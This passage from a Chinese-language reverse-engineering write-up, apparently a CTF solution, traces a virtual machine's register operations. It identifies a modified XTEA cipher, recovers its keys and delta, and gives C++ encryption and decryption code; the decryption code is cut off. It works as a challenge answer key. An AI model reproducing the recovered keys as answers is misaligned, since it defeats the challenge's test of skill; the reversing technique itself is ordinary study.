class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4</span> &lt;&lt; <span class="number">0</span> = <span class="number">4</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4</span> &lt;&lt; <span class="number">1</span> = <span class="number">8</span></span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">32323232</span> &gt;&gt; <span class="number">5</span> = <span class="number">1919191</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">32323232</span> &lt;&lt; <span class="number">6</span> = c8c8c8c80</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">1919191</span> ^ <span class="number">8</span>c8c8c80 = <span class="number">8</span>d1d1d11</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">32323232</span> ^ <span class="number">11223344</span> = <span class="number">23100176</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">8</span>d1d1d11 + <span class="number">23100176</span> = b02d<span class="number">1e87</span></span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">0</span> &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">0</span> = <span class="number">776</span>f6853</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">776</span>f6853 ^ abab1212 = dcc47a41</span><br><span class="line">W3 = W1 ^ W0 --- b02d<span class="number">1e87</span> ^ dcc47a41 = <span class="number">6</span>ce964c6</span><br><span class="line">W2 = W1 + W0 --- <span class="number">6</span>ce964c6 + <span class="number">31313131</span> = <span class="number">9e1</span>a95f7</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">9e1</span>a95f7 &gt;&gt; <span class="number">4</span> = <span class="number">9e1</span>a95f</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">9e1</span>a95f7 &lt;&lt; <span class="number">7</span> = <span class="number">4</span>f0d4afb80</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">9e1</span>a95f ^ d4afb80 = <span class="number">4</span>ab52df</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">9e1</span>a95f7 ^ <span class="number">55667788</span> = cb7ce27f</span><br><span class="line">W2 = W1 + W0 --- <span class="number">4</span>ab52df + cb7ce27f = d028355e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">5</span>f5fe<span class="number">6e7</span> &gt;&gt; b = bebfc</span><br><span class="line">W2 = W0 &amp; W3 --- bebfc &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">5</span>f5fe<span class="number">6e7</span> = d6cf4f3a</span><br><span class="line">W2 = W0 ^ W3 --- d6cf4f3a ^ <span class="number">23235566</span> = f5ec1a5c</span><br><span class="line">W3 = W1 ^ W0 --- f5ec1a5c ^ d028355e = <span class="number">25</span>c42f02</span><br><span class="line">W2 = W1 + W0 --- <span class="number">25</span>c42f02 + <span class="number">32323232</span> = <span class="number">57</span>f66134</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">57</span>f66134 &gt;&gt; <span class="number">5</span> = <span class="number">2</span>bfb309</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">57</span>f66134 &lt;&lt; <span class="number">6</span> = <span class="number">15</span>fd984d00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">2</span>bfb309 ^ fd984d00 = ff27fe09</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">57</span>f66134 ^ <span class="number">11223344</span> = <span class="number">46</span>d45270</span><br><span class="line">W2 = W1 + W0 --- ff27fe09 + <span class="number">46</span>d45270 = <span class="number">145</span>fc5079</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">5</span>f5fe<span class="number">6e7</span> &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + <span class="number">5</span>f5fe<span class="number">6e7</span> = d3c94c4b</span><br><span class="line">W2 = W0 ^ W3 --- d3c94c4b ^ abab1212 = <span class="number">78625e59</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">45</span>fc5079 ^ <span class="number">78625e59</span> = <span class="number">3</span>d<span class="number">9e0</span>e20</span><br><span class="line">W2 = W1 + W0 --- <span class="number">3</span>d<span class="number">9e0</span>e20 + <span class="number">9e1</span>a95f7 = dbb8a417</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- dbb8a417 &gt;&gt; <span class="number">4</span> = dbb8a41</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- dbb8a417 &lt;&lt; <span class="number">7</span> = <span class="number">6</span>ddc520b80</span><br><span class="line">W3 = W1 ^ W0 --- dbb8a41 ^ dc520b80 = d<span class="number">1e981</span>c1</span><br><span class="line">W2 = W0 ^ W3 --- dbb8a417 ^ <span class="number">55667788</span> = <span class="number">8</span>eded39f</span><br><span class="line">W2 = W1 + W0 --- d<span class="number">1e981</span>c1 + <span class="number">8</span>eded39f = <span class="number">160</span>c85560</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bebfcdce &gt;&gt; b = <span class="number">17</span>d7f9</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">17</span>d7f9 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + bebfcdce = <span class="number">1242</span>b2f3b</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">242</span>b2f3b ^ <span class="number">23235566</span> = <span class="number">7087</span>a5d</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7087</span>a5d ^ <span class="number">60</span>c85560 = <span class="number">67</span>c02f3d</span><br><span class="line">W2 = W1 + W0 --- <span class="number">67</span>c02f3d + <span class="number">57</span>f66134 = bfb69071</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bfb69071 &gt;&gt; <span class="number">5</span> = <span class="number">5</span>fdb483</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- bfb69071 &lt;&lt; <span class="number">6</span> = <span class="number">2</span>feda41c40</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>fdb483 ^ eda41c40 = e859a8c3</span><br><span class="line">W2 = W0 ^ W3 --- bfb69071 ^ <span class="number">11223344</span> = ae94a335</span><br><span class="line">W2 = W1 + W0 --- e859a8c3 + ae94a335 = <span class="number">196</span>ee4bf8</span><br><span class="line">W2 = W0 &amp; W3 --- bebfcdce &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + bebfcdce = <span class="number">1202</span>d2d40</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">202</span>d2d40 ^ abab1212 = <span class="number">8</span>b863f52</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">96</span>ee4bf8 ^ <span class="number">8</span>b863f52 = <span class="number">1</span>d6874aa</span><br><span class="line">W2 = W1 + W0 --- <span class="number">1</span>d6874aa + dbb8a417 = f92118c1</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- f92118c1 &gt;&gt; <span class="number">4</span> = f92118c</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- f92118c1 &lt;&lt; <span class="number">7</span> = <span class="number">7</span>c908c6080</span><br><span class="line">W3 = W1 ^ W0 --- f92118c ^ <span class="number">908</span>c6080 = <span class="number">9</span>f<span class="number">1e710</span>c</span><br><span class="line">W2 = W0 ^ W3 --- f92118c1 ^ <span class="number">55667788</span> = ac476f49</span><br><span class="line">W2 = W1 + W0 --- <span class="number">9</span>f<span class="number">1e710</span>c + ac476f49 = <span class="number">14</span>b<span class="number">65e055</span></span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">1e1f</span>b4b5 &gt;&gt; b = <span class="number">3</span>c3f6</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">3</span>c3f6 &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">1e1f</span>b4b5 = <span class="number">7</span>f8d1427</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">7</span>f8d1427 ^ <span class="number">23235566</span> = <span class="number">5</span>cae4141</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>cae4141 ^ <span class="number">4</span>b<span class="number">65e055</span> = <span class="number">17</span>cba114</span><br><span class="line">W2 = W1 + W0 --- <span class="number">17</span>cba114 + bfb69071 = d7823185</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- d7823185 &gt;&gt; <span class="number">5</span> = <span class="number">6</span>bc118c</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- d7823185 &lt;&lt; <span class="number">6</span> = <span class="number">35e08</span>c6140</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">6</span>bc118c ^ e08c6140 = e63070cc</span><br><span class="line">W2 = W0 ^ W3 --- d7823185 ^ <span class="number">11223344</span> = c6a002c1</span><br><span class="line">W2 = W1 + W0 --- e63070cc + c6a002c1 = <span class="number">1</span>acd0738d</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1e1f</span>b4b5 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">1e1f</span>b4b5 = <span class="number">838</span>b1622</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">838</span>b1622 ^ abab1212 = <span class="number">28200430</span></span><br><span class="line">W3 = W1 ^ W0 --- acd0738d ^ <span class="number">28200430</span> = <span class="number">84</span>f077bd</span><br><span class="line">W2 = W1 + W0 --- <span class="number">84</span>f077bd + f92118c1 = <span class="number">17e11907</span>e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">7e11907</span>e &gt;&gt; <span class="number">4</span> = <span class="number">7e11907</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">7e11907</span>e &lt;&lt; <span class="number">7</span> = <span class="number">3</span>f08c83f00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7e11907</span> ^ <span class="number">8</span>c83f00 = f292607</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">7e11907</span>e ^ <span class="number">55667788</span> = <span class="number">2</span>b<span class="number">77e7f</span>6</span><br><span class="line">W2 = W1 + W0 --- f292607 + <span class="number">2</span>b<span class="number">77e7f</span>6 = <span class="number">3</span>aa10dfd</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">7</span>d7f9b9c &gt;&gt; b = faff3</span><br><span class="line">W2 = W0 &amp; W3 --- faff3 &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + <span class="number">7</span>d7f9b9c = f<span class="number">1e90100</span></span><br><span class="line">W2 = W0 ^ W3 --- f<span class="number">1e90100</span> ^ <span class="number">23235566</span> = d2ca5466</span><br><span class="line">W3 = W1 ^ W0 --- d2ca5466 ^ <span class="number">3</span>aa10dfd = e86b599b</span><br><span class="line">W2 = W1 + W0 --- e86b599b + d7823185 = <span class="number">1</span>bfed8b20</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bfed8b20 &gt;&gt; <span class="number">5</span> = <span class="number">5</span>ff6c59</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- bfed8b20 &lt;&lt; <span class="number">6</span> = <span class="number">2</span>ffb62c800</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>ff6c59 ^ fb62c800 = fe9da459</span><br><span class="line">W2 = W0 ^ W3 --- bfed8b20 ^ <span class="number">11223344</span> = aecfb864</span><br><span class="line">W2 = W1 + W0 --- fe9da459 + aecfb864 = <span class="number">1</span>ad6d5cbd</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">7</span>d7f9b9c &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">7</span>d7f9b9c = f4ef03ef</span><br><span class="line">W2 = W0 ^ W3 --- f4ef03ef ^ abab1212 = <span class="number">5</span>f4411fd</span><br><span class="line">W3 = W1 ^ W0 --- ad6d5cbd ^ <span class="number">5</span>f4411fd = f2294d40</span><br><span class="line">W2 = W1 + W0 --- f2294d40 + <span class="number">7e11907</span>e = <span class="number">1703</span>addbe</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">703</span>addbe &gt;&gt; <span class="number">4</span> = <span class="number">703</span>addb</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">703</span>addbe &lt;&lt; <span class="number">7</span> = <span class="number">381</span>d6edf00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">703</span>addb ^ <span class="number">1</span>d6edf00 = <span class="number">1</span>a6d72db</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">703</span>addbe ^ <span class="number">55667788</span> = <span class="number">255</span>caa36</span><br><span class="line">W2 = W1 + W0 --- <span class="number">1</span>a6d72db + <span class="number">255</span>caa36 = <span class="number">3</span>fca1d11</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- dcdf8283 &gt;&gt; b = <span class="number">1</span>b9bf0</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1</span>b9bf0 &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + dcdf8283 = <span class="number">1544</span>eead6</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">544</span>eead6 ^ <span class="number">23235566</span> = <span class="number">776</span>dbfb0</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">776</span>dbfb0 ^ <span class="number">3</span>fca1d11 = <span class="number">48</span>a7a2a1</span><br><span class="line">W2 = W1 + W0 --- <span class="number">48</span>a7a2a1 + bfed8b20 = <span class="number">108952</span>dc1</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">8952</span>dc1 &gt;&gt; <span class="number">5</span> = <span class="number">44</span>a96e</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">8952</span>dc1 &lt;&lt; <span class="number">6</span> = <span class="number">2254</span>b7040</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">44</span>a96e ^ <span class="number">254</span>b7040 = <span class="number">250</span>fd92e</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">8952</span>dc1 ^ <span class="number">11223344</span> = <span class="number">19</span>b<span class="number">71e85</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">250</span>fd92e + <span class="number">19</span>b<span class="number">71e85</span> = <span class="number">3</span>ec6f7b3</span><br><span class="line">W2 = W0 &amp; W3 --- dcdf8283 &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + dcdf8283 = <span class="number">15148e7</span>e7</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">5148e7</span>e7 ^ abab1212 = fae3f5f5</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">3</span>ec6f7b3 ^ fae3f5f5 = c4250246</span><br><span class="line">W2 = W1 + W0 --- c4250246 + <span class="number">703</span>addbe = <span class="number">1345</span>fe004</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">345</span>fe004 &gt;&gt; <span class="number">4</span> = <span class="number">345</span>fe00</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">345</span>fe004 &lt;&lt; <span class="number">7</span> = <span class="number">1</span>a2ff00200</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">345</span>fe00 ^ <span class="number">2</span>ff00200 = <span class="number">2</span>cb5fc00</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">345</span>fe004 ^ <span class="number">55667788</span> = <span class="number">6139978</span>c</span><br><span class="line">W2 = W1 + W0 --- <span class="number">2</span>cb5fc00 + <span class="number">6139978</span>c = <span class="number">8</span>def938c</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">3</span>c3f696a &gt;&gt; b = <span class="number">787</span>ed</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">787</span>ed &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">3</span>c3f696a = a1aacad7</span><br><span class="line">W2 = W0 ^ W3 --- a1aacad7 ^ <span class="number">23235566</span> = <span class="number">82899</span>fb1</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">82899</span>fb1 ^ <span class="number">8</span>def938c = f660c3d</span><br><span class="line">W2 = W1 + W0 --- f660c3d + <span class="number">8952</span>dc1 = <span class="number">17</span>fb39fe</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">17</span>fb39fe &gt;&gt; <span class="number">5</span> = bfd9cf</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">17</span>fb39fe &lt;&lt; <span class="number">6</span> = <span class="number">5</span>fece7f80</span><br><span class="line">W3 = W1 ^ W0 --- bfd9cf ^ fece7f80 = fe71a64f</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">17</span>fb39fe ^ <span class="number">11223344</span> = <span class="number">6</span>d90aba</span><br><span class="line">W2 = W1 + W0 --- fe71a64f + <span class="number">6</span>d90aba = <span class="number">1054</span>ab109</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">3</span>c3f696a &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">3</span>c3f696a = <span class="number">9</span>dacc8dc</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">9</span>dacc8dc ^ abab1212 = <span class="number">3607</span>dace</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">54</span>ab109 ^ <span class="number">3607</span>dace = <span class="number">334</span>d6bc7</span><br><span class="line">W2 = W1 + W0 --- <span class="number">334</span>d6bc7 + <span class="number">345</span>fe004 = <span class="number">67</span>ad4bcb</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">67</span>ad4bcb &gt;&gt; <span class="number">4</span> = <span class="number">67</span>ad4bc</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">67</span>ad4bcb &lt;&lt; <span class="number">7</span> = <span class="number">33</span>d6a<span class="number">5e580</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">67</span>ad4bc ^ d6a<span class="number">5e580</span> = d0df313c</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">67</span>ad4bcb ^ <span class="number">55667788</span> = <span class="number">32</span>cb3c43</span><br><span class="line">W2 = W1 + W0 --- d0df313c + <span class="number">32</span>cb3c43 = <span class="number">103</span>aa6d7f</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">9</span>b9f5051 &gt;&gt; b = <span class="number">1373</span>ea</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1373</span>ea &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">9</span>b9f5051 = fd0cafc3</span><br><span class="line">W2 = W0 ^ W3 --- fd0cafc3 ^ <span class="number">23235566</span> = de2ffaa5</span><br><span class="line">W3 = W1 ^ W0 --- de2ffaa5 ^ <span class="number">3</span>aa6d7f = dd8597da</span><br><span class="line">W2 = W1 + W0 --- dd8597da + <span class="number">17</span>fb39fe = f580d1d8</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- f580d1d8 &gt;&gt; <span class="number">5</span> = <span class="number">7</span>ac068e</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- f580d1d8 &lt;&lt; <span class="number">6</span> = <span class="number">3</span>d60347600</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7</span>ac068e ^ <span class="number">60347600</span> = <span class="number">6798708</span>e</span><br><span class="line">W2 = W0 ^ W3 --- f580d1d8 ^ <span class="number">11223344</span> = e4a<span class="number">2e29</span>c</span><br><span class="line">W2 = W1 + W0 --- <span class="number">6798708</span>e + e4a<span class="number">2e29</span>c = <span class="number">14</span>c3b532a</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">9</span>b9f5051 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">9</span>b9f5051 = <span class="number">1010</span>ab1be</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">10</span>ab1be ^ abab1212 = aaa1a3ac</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">4</span>c3b532a ^ aaa1a3ac = e69af086</span><br><span class="line">W2 = W1 + W0 --- e69af086 + <span class="number">67</span>ad4bcb = <span class="number">14e483</span>c51</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">4e483</span>c51 &gt;&gt; <span class="number">4</span> = <span class="number">4e483</span>c5</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4e483</span>c51 &lt;&lt; <span class="number">7</span> = <span class="number">27241e2880</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">4e483</span>c5 ^ <span class="number">241e2880</span> = <span class="number">20</span>faab45</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">4e483</span>c51 ^ <span class="number">55667788</span> = <span class="number">1</span>b<span class="number">2e4</span>bd9</span><br><span class="line">W2 = W1 + W0 --- <span class="number">20</span>faab45 + <span class="number">1</span>b<span class="number">2e4</span>bd9 = <span class="number">3</span>c28f71e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- faff3738 &gt;&gt; b = <span class="number">1</span>f5fe6</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1</span>f5fe6 &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + faff3738 = <span class="number">15</span>c6c96aa</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">5</span>c6c96aa ^ <span class="number">23235566</span> = <span class="number">7</span>f4fc3cc</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7</span>f4fc3cc ^ <span class="number">3</span>c28f71e = <span class="number">436734</span>d2</span><br><span class="line">W2 = W1 + W0 --- <span class="number">436734</span>d2 + f580d1d8 = <span class="number">138e806</span>aa</span><br></pre></td></tr></table></figure><p>通过观察可以发现是一个魔改的XTea加密。</p><p>通过对比标准XTea加密流程，可以得到里面参与计算的4个key值 <strong>{0x776f6853,0x656b616d,0x616d5f72,0x74696564}</strong> 以及delta值 <strong>0x5f5fe6e7</strong></p><p>写出对应加密的c++代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 += tmp2;</span><br><span class="line">        sum += delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 += tmp4;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x5f5fe6e7</span> * <span class="number">72</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 -= tmp4;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span 